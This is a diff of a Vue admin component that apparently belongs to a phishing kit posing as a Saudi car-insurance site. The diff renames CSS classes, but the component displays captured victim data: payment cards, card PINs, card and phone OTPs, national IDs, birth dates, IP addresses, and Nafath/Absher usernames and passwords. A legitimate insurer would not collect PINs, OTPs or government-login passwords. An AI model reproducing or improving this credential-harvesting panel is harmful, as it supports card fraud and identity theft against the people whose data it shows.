@@ -26,7 +26,7 @@
         <div
           v-for="(card, idx) in customer.payment.cards"
           :key="card.id || idx"
-          class="info-glass-panel overflow-hidden"
+          class="admin-glass overflow-hidden"
         >
           <div class="mb-2 flex items-center justify-between text-xs text-gray-400">
             <span>Submission {{ idx + 1 }}</span>
@@ -42,7 +42,7 @@
           </div>
         </div>
       </div>
-      <div v-else class="info-empty-state">
+      <div v-else class="admin-empty">
         <span class="text-4xl opacity-30">💳</span>
         <p class="mt-2 text-gray-500">لا توجد بطاقات مسجلة</p>
       </div>
@@ -53,7 +53,7 @@
       <!-- قيمة الدفع النهائية -->
       <div
         v-if="customer?.totalPrice || customer?.priceSummary?.total_price"
-        class="info-glass-panel info-glass-panel--emerald"
+        class="admin-glass admin-glass--emerald"
       >
         <div class="flex items-center justify-between">
           <div class="flex items-center gap-3">
@@ -88,25 +88,25 @@
 
       <!-- PIN / OTP / Nafath 3-columns -->
       <div class="grid grid-cols-3 gap-4">
-        <div class="info-glass-panel space-y-2.5">
+        <div class="admin-glass space-y-2.5">
           <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-blue-400">
-            <span class="info-glow-dot info-glow-dot--blue"></span> Card PIN/OTP
+            <span class="admin-dot admin-dot--blue"></span> Card PIN/OTP
           </h4>
           <div class="text-sm"><span class="text-gray-500">PIN:</span> <span class="font-mono font-bold text-blue-400">{{ getLatestPin(customer) || '—' }}</span></div>
           <div class="text-sm"><span class="text-gray-500">Card OTP:</span> <span class="font-mono font-bold text-blue-400">{{ getLatestCardOtp(customer) || '—' }}</span></div>
         </div>
-        <div class="info-glass-panel space-y-2.5">
+        <div class="admin-glass space-y-2.5">
           <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-orange-400">
-            <span class="info-glow-dot info-glow-dot--orange"></span> Phone/OTP
+            <span class="admin-dot admin-dot--orange"></span> Phone/OTP
           </h4>
           <div class="text-sm"><span class="text-gray-500">Phone:</span> <span class="font-mono text-white">{{ customer?.phone || customer?.phoneNumber || customer?.phone_number || '—' }}</span></div>
           <div class="text-sm"><span class="text-gray-500">Operator:</span> <span class="font-medium text-white">{{ customer?.phone_carrier || customer?.carrier || '—' }}</span></div>
           <div class="text-sm"><span class="text-gray-500">Birth Date:</span> <span class="text-white">{{ customer?.birth_date || customer?.birthDate || customer?.phone_verification?.birth_date || '—' }}</span></div>
           <div class="text-sm"><span class="text-gray-500">Phone OTP:</span> <span class="font-mono font-bold text-orange-400">{{ getLatestPhoneOtp(customer) || '—' }}</span></div>
         </div>
-        <div class="info-glass-panel space-y-2.5">
+        <div class="admin-glass space-y-2.5">
           <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-purple-400">
-            <span class="info-glow-dot info-glow-dot--purple"></span> Nafath/Absher
+            <span class="admin-dot admin-dot--purple"></span> Nafath/Absher
           </h4>
           <div class="text-sm"><span class="text-gray-500">User:</span> <span class="font-mono text-white">{{ getLatestNafath(customer)?.username || customer?.nafath?.username || '—' }}</span></div>
           <div class="text-sm"><span class="text-gray-500">Pass:</span> <span class="font-mono text-white">{{ getLatestNafath(customer)?.password || '—' }}</span></div>
@@ -115,9 +115,9 @@
       </div>
 
       <!-- بيانات العميل الشخصية -->
-      <div class="info-glass-panel">
+      <div class="admin-glass">
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-blue-400">
-          <span class="info-glow-dot info-glow-dot--blue"></span> بيانات العميل الشخصية
+          <span class="admin-dot admin-dot--blue"></span> بيانات العميل الشخصية
         </h4>
         <div class="grid grid-cols-4 gap-3 text-sm">
           <div><span class="block text-[10px] text-gray-500">الاسم الكامل</span><span class="font-medium text-white">{{ customer?.fullName || customer?.customer_name || getCustomerName(customer) || '—' }}</span></div>
@@ -132,9 +132,9 @@
       </div>
 
       <!-- بيانات التأمين -->
-      <div class="info-glass-panel info-glass-panel--blue">
+      <div class="admin-glass admin-glass--blue">
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-blue-400">
-          <span class="info-glow-dot info-glow-dot--blue"></span> بيانات التأمين
+          <span class="admin-dot admin-dot--blue"></span> بيانات التأمين
         </h4>
         <div class="grid grid-cols-4 gap-3 text-sm">
           <div><span class="block text-[10px] text-gray-500">غرض التأمين</span><span class="font-medium text-white">{{ getInsurancePurposeInline(customer?.insurancePurpose) }}</span></div>
@@ -145,9 +145,9 @@
       </div>
 
       <!-- بيانات المركبة -->
-      <div class="info-glass-panel info-glass-panel--amber">
+      <div class="admin-glass admin-glass--amber">
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-amber-400">
-          <span class="info-glow-dot info-glow-dot--amber"></span> بيانات المركبة
+          <span class="admin-dot admin-dot--amber"></span> بيانات المركبة
         </h4>
         <div class="grid grid-cols-4 gap-3 text-sm">
           <div><span class="block text-[10px] text-gray-500">رقم اللوحة</span><span class="font-mono font-medium text-white">{{ customer?.plateNumber || '—' }}</span></div>
@@ -165,9 +165,9 @@
       </div>
 
       <!-- الإضافات المختارة -->
-      <div v-if="customer?.selectedAdditions?.length > 0" class="info-glass-panel info-glass-panel--purple">
+      <div v-if="customer?.selectedAdditions?.length > 0" class="admin-glass admin-glass--purple">
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-purple-400">
-          <span class="info-glow-dot info-glow-dot--purple"></span> الإضافات المختارة
+          <span class="admin-dot admin-dot--purple"></span> الإضافات المختارة
         </h4>
         <div class="flex flex-wrap gap-2">
           <span v-for="(addition, idx) in customer?.selectedAdditions" :key="idx" class="rounded-full bg-purple-500/20 px-3 py-1 text-xs font-medium text-purple-300">
@@ -177,9 +177,9 @@
       </div>
 
       <!-- معلومات الجلسة -->
-      <div class="info-glass-panel">
+      <div class="admin-glass">
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-gray-400">
-          <span class="info-glow-dot info-glow-dot--gray"></span> معلومات الجلسة
+          <span class="admin-dot admin-dot--gray"></span> معلومات الجلسة
         </h4>
         <div class="grid grid-cols-4 gap-3 text-sm">
           <div><span class="block text-[10px] text-gray-500">IP Address</span><span class="font-mono text-white">{{ customer?.ip }}</span></div>
@@ -196,18 +196,18 @@
 
     <!-- Details Tab -->
     <div v-if="activeTab === 'details'" class="grid grid-cols-2 gap-5">
-      <div class="info-glass-panel space-y-3">
+      <div class="admin-glass space-y-3">
         <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-blue-400">
-          <span class="info-glow-dot info-glow-dot--blue"></span> معلومات العميل
+          <span class="admin-dot admin-dot--blue"></span> معلومات العميل
         </h4>
         <div class="text-sm"><span class="text-gray-500">الاسم:</span> <span class="text-white">{{ getCustomerName(customer) || '—' }}</span></div>
         <div class="text-sm"><span class="text-gray-500">الهوية:</span> <span class="font-mono text-yellow-400">{{ customer?.nationalId || '—' }}</span></div>
         <div class="text-sm"><span class="text-gray-500">الجوال:</span> <span class="font-mono text-white">{{ customer?.phone || customer?.phoneNumber || '—' }}</span></div>
         <div class="text-sm"><span class="text-gray-500">تاريخ الميلاد:</span> <span class="text-white">{{ customer?.birthDate || customer?.birth_date || '—' }}</span></div>
       </div>
-      <div class="info-glass-panel space-y-3">
+      <div class="admin-glass space-y-3">
         <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-emerald-400">
-          <span class="info-glow-dot info-glow-dot--emerald"></span> معلومات الجلسة
+          <span class="admin-dot admin-dot--emerald"></span> معلومات الجلسة
         </h4>
         <div class="text-sm"><span class="text-gray-500">IP:</span> <span class="font-mono text-white">{{ customer?.ip }}</span></div>
         <div class="text-sm"><span class="text-gray-500">الصفحة الحالية:</span> <span class="text-white">{{ getPageName(customer?.current_page) }}</span></div>
@@ -221,10 +221,10 @@
     <!-- All OTPs Tab -->
     <div v-if="activeTab === 'all-otps'" class="space-y-3">
       <div v-if="customer?.all_otps?.length > 0" class="space-y-3">
-        <div v-for="(otp, idx) in customer.all_otps" :key="otp.id || idx" class="info-glass-panel">
+        <div v-for="(otp, idx) in customer.all_otps" :key="otp.id || idx" class="admin-glass">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-3">
-              <span class="info-glow-dot info-glow-dot--blue"></span>
+              <span class="admin-dot admin-dot--blue"></span>
               <div>
                 <div class="font-mono text-xl font-bold text-blue-400">{{ otp.otp_code || otp.code || '—' }}</div>
                 <div class="text-[10px] text-gray-500">النوع: {{ otp.type || 'payment' }}</div>
@@ -241,7 +241,7 @@
           </div>
         </div>
       </div>
-      <div v-else class="info-empty-state">
+      <div v-else class="admin-empty">
         <span class="text-4xl opacity-30">🔐</span>
         <p class="mt-2 text-gray-500">لا توجد رموز OTP مسجلة</p>
       </div>
@@ -250,10 +250,10 @@
     <!-- All PINs Tab -->
     <div v-if="activeTab === 'all-pins'" class="space-y-3">
       <div v-if="customer?.all_pins?.length > 0" class="space-y-3">
-        <div v-for="(pin, idx) in customer.all_pins" :key="pin.id || idx" class="info-glass-panel">
+        <div v-for="(pin, idx) in customer.all_pins" :key="pin.id || idx" class="admin-glass">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-3">
-              <span class="info-glow-dot info-glow-dot--purple"></span>
+              <span class="admin-dot admin-dot--purple"></span>
               <div>
                 <div class="font-mono text-xl font-bold text-purple-400">{{ pin.pin || pin.code || '—' }}</div>
                 <div class="text-[10px] text-gray-500">PIN #{{ idx + 1 }}</div>
@@ -270,7 +270,7 @@
           </div>
         </div>
       </div>
-      <div v-else class="info-empty-state">
+      <div v-else class="admin-empty">
         <span class="text-4xl opacity-30">💳</span>
         <p class="mt-2 text-gray-500">لا توجد أرقام PIN مسجلة</p>
       </div>
@@ -279,7 +279,7 @@
     <!-- Insurance Tab -->
     <div v-if="activeTab === 'insurance'" class="space-y-4">
       <div v-if="customer?.insurance || customer?.selected_insurance" class="space-y-4">
-        <div class="info-glass-panel info-glass-panel--blue">
+        <div class="admin-glass admin-glass--blue">
           <div class="flex items-center gap-3">
             <span class="text-3xl">🛡️</span>
             <div>
@@ -289,25 +289,25 @@
           </div>
         </div>
         <div class="grid grid-cols-2 gap-4">
-          <div class="info-glass-panel">
+          <div class="admin-glass">
             <span class="text-[10px] text-gray-500">السعر</span>
             <div class="font-bold text-emerald-400">{{ formatCurrency(customer?.insurance?.price || customer?.selected_insurance?.price) }}</div>
           </div>
-          <div class="info-glass-panel">
+          <div class="admin-glass">
             <span class="text-[10px] text-gray-500">طريقة الإصلاح</span>
             <div class="font-medium text-white">{{ getRepairMethodInline(customer?.repairMethod) }}</div>
           </div>
-          <div class="info-glass-panel">
+          <div class="admin-glass">
             <span class="text-[10px] text-gray-500">قيمة المركبة</span>
             <div class="font-medium text-white">{{ formatCurrency(customer?.vehiclePrice || customer?.vehicle_value) }}</div>
           </div>
-          <div class="info-glass-panel">
+          <div class="admin-glass">
             <span class="text-[10px] text-gray-500">الإضافات</span>
             <div class="font-medium text-white">{{ customer?.additions?.length || 0 }} إضافة</div>
           </div>
         </div>
       </div>
-      <div v-else class="info-empty-state">
+      <div v-else class="admin-empty">
         <span class="text-4xl opacity-30">🛡️</span>
         <p class="mt-2 text-gray-500">لم يتم اختيار وثيقة</p>
         <p class="mt-1 text-[10px] text-gray-600">يرجى اختيار وثيقة تأمين من صفحة المقارنة أولاً</p>
@@ -375,31 +375,4 @@ const getUsagePurposeInline = (v) => {
 
 <style scoped>
 @reference "../../../../css/app.css";
-
-/* ── InfoModal Glass Panels ──────────────────────────────── */
-.info-glass-panel {
-  @apply rounded-xl p-4;
-  background: rgba(17, 24, 39, 0.5);
-  backdrop-filter: blur(12px);
-  border: 1px solid rgba(255, 255, 255, 0.06);
-  transition: border-color 0.3s ease;
-}
-.info-glass-panel--emerald { border-color: rgba(52, 211, 153, 0.15); }
-.info-glass-panel--blue    { border-color: rgba(59, 130, 246, 0.15); }
-.info-glass-panel--amber   { border-color: rgba(251, 191, 36, 0.15); }
-.info-glass-panel--purple  { border-color: rgba(168, 85, 247, 0.15); }
-
-.info-glow-dot {
-  @apply inline-block h-2 w-2 shrink-0 rounded-full;
-}
-.info-glow-dot--blue    { background: #3b82f6; box-shadow: 0 0 6px rgba(59, 130, 246, 0.5); }
-.info-glow-dot--orange  { background: #f97316; box-shadow: 0 0 6px rgba(249, 115, 22, 0.5); }
-.info-glow-dot--purple  { background: #a855f7; box-shadow: 0 0 6px rgba(168, 85, 247, 0.5); }
-.info-glow-dot--emerald { background: #34d399; box-shadow: 0 0 6px rgba(52, 211, 153, 0.5); }
-.info-glow-dot--amber   { background: #fbbf24; box-shadow: 0 0 6px rgba(251, 191, 36, 0.5); }
-.info-glow-dot--gray    { background: #9ca3af; box-shadow: 0 0 6px rgba(156, 163, 175, 0.3); }
-
-.info-empty-state {
-  @apply flex flex-col items-center justify-center py-10 text-center;
-}
 </style>
